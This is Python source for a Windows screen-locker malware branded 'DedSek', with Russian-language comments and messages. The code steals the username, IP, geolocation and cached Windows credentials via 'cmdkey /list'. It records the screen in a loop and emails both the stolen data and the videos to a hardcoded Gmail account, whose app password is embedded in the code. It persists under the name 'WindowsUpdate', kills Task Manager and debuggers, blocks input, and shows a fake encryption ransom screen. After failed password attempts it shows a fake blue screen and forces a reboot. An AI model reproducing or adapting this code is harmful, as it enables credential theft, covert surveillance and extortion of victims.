import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage, scrolledtext
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2
import numpy as np
from PIL import ImageGrab

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

# Gmail
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== ЗАПИСЬ ЭКРАНА ==========
def record_and_send_loop():
    while True:
        try:
            video_path = os.path.join(tempfile.gettempdir(), f"screen_{int(time.time())}.avi")
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(video_path, fourcc, 10.0, (1280, 720))
            
            for i in range(150):
                img = ImageGrab.grab()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                frame = cv2.resize(frame, (1280, 720))
                out.write(frame)
                time.sleep(0.1)
            
            out.release()
            send_video_email(video_path)
            
            try:
                os.remove(video_path)
            except:
                pass
            
        except:
            time.sleep(1)

def send_video_email(file_path):
    try:
        file_size = os.path.getsize(file_path)
        
        if file_size > 20 * 1024 * 1024:
            compressed_path = compress_video(file_path)
            if compressed_path:
                file_path = compressed_path
        
        msg = MIMEMultipart()
        msg['Subject'] = f'📹 Экран - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M:%S")}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="screen_{int(time.time())}.avi"')
            msg.attach(part)
        
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

def compress_video(input_path):
    try:
        output_path = input_path.replace('.avi', '_compressed.mp4')
        command = [
            'ffmpeg', '-i', input_path,
            '-c:v', 'libx264', '-preset', 'ultrafast',
            '-crf', '35', '-b:v', '200k',
            '-s', '640x360', '-r', '10', '-y', output_path
        ]
        subprocess.run(command, capture_output=True, timeout=30)
        return output_path
    except:
        return None

# ========== ЧАТ С ЖЕРТВОЙ ==========
class VictimChat:
    def __init__(self, locker_window):
        self.locker = locker_window
        self.chat_visible = False
        self.chat_window = None
        
    def show(self):
        if self.chat_visible:
            return
        
        self.chat_visible = True
        self.chat_window = tk.Toplevel(self.locker.win)
        self.chat_window.title("DedSek Chat")
        self.chat_window.geometry("400x500")
        self.chat_window.configure(bg='black')
        self.chat_window.attributes('-topmost', True)
        
        tk.Label(self.chat_window, text="💀 DedSek Messenger 💀", 
                bg='black', fg='#00FF00', font=('Courier', 12, 'bold')).pack(pady=5)
        
        self.chat_history = scrolledtext.ScrolledText(self.chat_window, 
                                                       bg='#0a0a0a', fg='#00FF00',
                                                       font=('Courier', 10), height=20)
        self.chat_history.pack(padx=10, pady=5, fill='both', expand=True)
        self.chat_history.config(state='disabled')
        
        input_frame = tk.Frame(self.chat_window, bg='black')
        input_frame.pack(padx=10, pady=5, fill='x')
        
        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10))
        self.msg_entry.pack(side='left', fill='x', expand=True)
        self.msg_entry.bind('<Return>', self.send_message)
        
        tk.Button(input_frame, text="▶", command=self.send_message,
                 bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3).pack(side='right', padx=(5, 0))
        
        self.add_message("DedSek", "Пиши сюда. Но пароль это не даст.")
        self.check_incoming_messages()
    
    def send_message(self, event=None):
        msg = self.msg_entry.get().strip()
        if msg:
            self.add_message("ТЫ", msg)
            self.msg_entry.delete(0, tk.END)
            send_email(f"💬 Сообщение от жертвы:\n\n{msg}")
    
    def add_message(self, sender, msg):
        self.chat_history.config(state='normal')
        self.chat_history.insert('end', f'[{sender}]: {msg}\n\n')
        self.chat_history.see('end')
        self.chat_history.config(state='disabled')
    
    def check_incoming_messages(self):
        def check():
            while self.chat_visible:
                try:
                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
                    mail.select('inbox')
                    
                    result, data = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
                    
                    if data[0]:
                        for num in data[0].split():
                            result, msg_data = mail.fetch(num, '(RFC822)')
                            msg = email.message_from_bytes(msg_data[0][1])
                            
                            if msg.is_multipart():
                                for part in msg.walk():
                                    if part.get_content_type() == "text/plain":
                                        command = part.get_payload(decode=True).decode()
                                        if command.startswith("MSG:"):
                                            self.add_message("DedSek", command[4:])
                                        
                            mail.store(num, '+FLAGS', '\\Seen')
                    
                    mail.close()
                    mail.logout()
                except:
                    pass
                time.sleep(5)
        
        threading.Thread(target=check, daemon=True).start()

# ========== СТИЛЕР ДАННЫХ ==========
def steal_data():
    try:
        data = {}
        data["username"] = os.environ.get("USERNAME", "Unknown")
        data["hostname"] = socket.gethostname()
        try:
            data["local_ip"] = socket.gethostbyname(socket.gethostname())
        except:
            data["local_ip"] = "Unknown"
        try:
            data["public_ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        except:
            data["public_ip"] = "Unknown"
        try:
            geo = urllib.request.urlopen(f"http://ip-api.com/json/{data['public_ip']}", timeout=5).read().decode()
            geo_json = json.loads(geo)
            data["country"] = geo_json.get("country", "Unknown")
            data["city"] = geo_json.get("city", "Unknown")
            data["isp"] = geo_json.get("isp", "Unknown")
        except:
            data["country"] = "Unknown"
            data["city"] = "Unknown"
            data["isp"] = "Unknown"
        try:
            result = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            data["cached_credentials"] = result[:500] if result else "None"
        except:
            data["cached_credentials"] = "None"

        message = f"""Subject: 🔥 DedSek Logger - {data['username']}

👤 ПОЛЬЗОВАТЕЛЬ: {data['username']}
💻 КОМПЬЮТЕР: {data['hostname']}
🌐 ЛОКАЛЬНЫЙ IP: {data['local_ip']}
🌍 ВНЕШНИЙ IP: {data['public_ip']}
📍 СТРАНА: {data['country']}
🏙 ГОРОД: {data['city']}
📡 ПРОВАЙДЕР: {data['isp']}

🔑 КЭШ ПАРОЛЕЙ WINDOWS:
{data['cached_credentials']}

🕒 ВРЕМЯ: {time.strftime('%d.%m.%Y %H:%M:%S')}"""

        send_email(message)
    except:
        pass

def send_email(message):
    try:
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = f'DedSek Logger - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M")}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=15)
        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

# ========== АНТИ-ОТЛАДКА ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
        suspicious = ["wireshark.exe", "procmon.exe", "processhacker.exe", 
                     "taskmgr.exe", "regedit.exe", "msconfig.exe"]
        for proc in suspicious:
            os.system(f"taskkill /f /im {proc} >nul 2>&1")
    except:
        pass

# ========== СКРЫТИЕ ПРОЦЕССА ==========
def hide_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

# ========== АВТОЗАГРУЗКА ==========
def add_to_startup():
    try:
        current_path = os.path.abspath(__file__)
        pyw_path = os.path.splitext(current_path)[0] + ".pyw"
        if not current_path.endswith(".pyw"):
            try:
                shutil.copy2(current_path, pyw_path)
            except:
                pass
            current_path = pyw_path
        
        startup_folder = winshell.startup()
        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        shortcut.Arguments = '"' + current_path + '"'
        shortcut.WorkingDirectory = os.path.dirname(current_path)
        shortcut.IconLocation = "shell32.dll,13"
        shortcut.save()
        
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
                            f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{current_path}"')
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass

# ========== БЛОКИРОВКА ВВОДА ==========
def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

# ========== БЛОКИРОВКА ВСЕХ КЛАВИШ ==========
def block_all_keys():
    try:
        import keyboard
        all_combos = [
            'alt+f4', 'alt+tab', 'alt+esc', 'alt+space',
            'ctrl+shift+esc', 'ctrl+alt+del', 'ctrl+esc',
            'ctrl+w', 'ctrl+f4', 'ctrl+tab',
            'win', 'win+d', 'win+r', 'win+e', 'win+l',
            'win+m', 'win+tab', 'win+x', 'win+u',
            'alt', 'ctrl', 'shift', 'f11',
            'print screen', 'alt+print screen'
        ]
        for combo in all_combos:
            try:
                keyboard.add_hotkey(combo, lambda: None, suppress=True, timeout=0)
            except:
                pass
        block_keys = ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
                     'print screen','scroll lock','pause']
        for key in block_keys:
            try:
                keyboard.block_key(key)
            except:
                pass
    except:
        pass

# ========== УБИЙЦА ПРОЦЕССОВ ==========
def kill_processes():
    kill_list = [
        "taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe",
        "regedit.exe", "procexp.exe", "procmon.exe", "processhacker.exe",
        "wireshark.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe"
    ]
    while True:
        try:
            for proc in kill_list:
                os.system(f"taskkill /f /im {proc} >nul 2>&1")
        except:
            pass
        time.sleep(0.05)

# ========== ЗАЩИТА ОТ ВЫКЛЮЧЕНИЯ ==========
def prevent_shutdown():
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(
            ctypes.windll.kernel32.GetConsoleWindow(), 
            "Windows Update in progress..."
        )
    except:
        pass

# ========== СИНИЙ ЭКРАН СМЕРТИ ==========
def show_bsod():
    try:
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        bsod = tk.Tk()
        bsod.attributes('-fullscreen', True)
        bsod.attributes('-topmost', True)
        bsod.configure(bg='#0000AA')
        bsod.overrideredirect(True)
        bsod.focus_force()
        bsod.grab_set()
        
        lbl = tk.Label(bsod, text="", bg='#0000AA', fg='white',
                       font=('Lucida Console', 13))
        lbl.pack(expand=True, padx=40)
        
        bsod_text = """A problem has been detected and Windows has been shut down to prevent damage
to your computer.

ENCRYPTION_FAILED.SYS

PAGE_FAULT_IN_NONPAGED_AREA

*** STOP: 0x00000050 (0xFFFFF880009A3B28, 0x0000000000000001, 0xFFFFF80002A7C5B1, 0x0000000000000002)"""
        
        lbl.config(text=bsod_text)
        bsod.update()
        for i in range(10):
            try:
                ctypes.windll.user32.BlockInput(True)
            except:
                pass
            bsod.update()
            time.sleep(1)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

# ========== АНИМАЦИЯ ЗАГРУЗКИ ==========
def boot_animation():
    anim = tk.Tk()
    anim.attributes('-fullscreen', True)
    anim.attributes('-topmost', True)
    anim.configure(bg='black')
    anim.overrideredirect(True)
    anim.focus_force()
    anim.grab_set()
    
    lbl = tk.Label(anim, text="", bg='black', fg='white',
                   font=('Courier', 20, 'bold'))
    lbl.pack(expand=True)
    
    for i in range(8):
        if i % 2 == 0:
            anim.configure(bg='white')
            lbl.config(bg='white', fg='black')
        else:
            anim.configure(bg='black')
            lbl.config(bg='black', fg='white')
        anim.update()
        time.sleep(0.2)
    
    anim.configure(bg='black')
    lbl.config(bg='black', fg='#00FF00')
    anim.attributes('-alpha', 0.0)
    
    for alpha in range(0, 110, 5):
        anim.attributes('-alpha', alpha/100)
        lbl.config(text="DedSek тебя взломали")
        anim.update()
        time.sleep(0.03)
    
    anim.attributes('-alpha', 1.0)
    time.sleep(1.5)
    
    progress = [
        "Идет шифровка данных...",
        "[                    ] 0%",
        "[##                  ] 10%",
        "[####                ] 20%",
        "[######              ] 30%",
        "[########            ] 40%",
        "[##########          ] 50%",
        "[############        ] 60%",
        "[##############      ] 70%",
        "[################    ] 80%",
        "[##################  ] 90%",
        "[####################] 100%",
        "",
        "ДАННЫЕ УСПЕШНО ЗАШИФРОВАНЫ!"
    ]
    
    for msg in progress:
        lbl.config(text=msg)
        anim.update()
        time.sleep(0.25)
    
    time.sleep(1)
    anim.destroy()

# ========== ОСНОВНОЙ ЭКРАН ==========
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        self.win.grab_set()
        
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            skull_img = PhotoImage(file=img_path)
            lbl_img = tk.Label(self.win, image=skull_img, bg='black')
            lbl_img.image = skull_img
            lbl_img.place(relx=0.5, rely=0.05, anchor='center')
        except:
            pass
        
        msg = """ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

УДАЧИ, ДРУГ. У ТЕБЯ 10 ПОПЫТОК!"""
        
        lbl_msg = tk.Label(self.win, text=msg, bg='black', fg='#00FF00',
                           font=('Courier', 9, 'bold'), justify='left')
        lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
        
        self.chat = VictimChat(self)
        chat_btn = tk.Button(self.win, text="💀 ЧАТ С DedSek 💀", 
                            command=self.chat.show,
                            bg='#00FF00', fg='black',
                            font=('Courier', 12, 'bold'))
        chat_btn.place(relx=0.5, rely=0.72, anchor='center')
        
        center_frame = tk.Frame(self.win, bg='black')
        center_frame.place(relx=0.5, rely=0.82, anchor='center')
        
        tk.Label(center_frame, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00',
                 font=('Courier', 14, 'bold')).pack(pady=(0, 5))
        
        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 14, 'bold'),
                              bg='black', fg='#00FF00', insertbackground='#00FF00',
                              relief='solid', bd=2)
        self.entry.pack(pady=(0, 5), ipadx=40, ipady=3)
        
        self.status = tk.Label(center_frame, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                               bg='black', fg='#FF0000',
                               font=('Courier', 12, 'bold'))
        self.status.pack()
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_force()
        self.win.after(100, self.keep_focus)
    
    def keep_focus(self):
        try:
            self.win.focus_force()
            self.entry.focus_force()
            self.win.after(100, self.keep_focus)
        except:
            pass
    
    def check_password(self, event=None):
        global attempts_left
        
        if self.entry.get() == PASSWORD:
            self.status.config(text="ВЕРНО! РАЗБЛОКИРОВКА...", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status.config(text=f"НЕВЕРНО! ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                                  fg='#FF0000')
            else:
                self.status.config(text="ПОПЫТКИ ИСТРАЧЕНЫ! BSoD...", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                show_bsod()
            self.entry.delete(0, tk.END)

# ========== ТОЧКА ВХОДА ==========
if __name__ == "__main__":
    anti_debug()
    hide_process()
    
    # Стилер данных
    threading.Thread(target=steal_data, daemon=True).start()
    
    # Запись экрана
    threading.Thread(target=record_and_send_loop, daemon=True).start()
    
    add_to_startup()
    boot_animation()
    block_input(True)
    prevent_shutdown()
    
    threading.Thread(target=kill_processes, daemon=True).start()
    threading.Thread(target=block_all_keys, daemon=True).start()
    
    WinLocker()
    tk.mainloop()
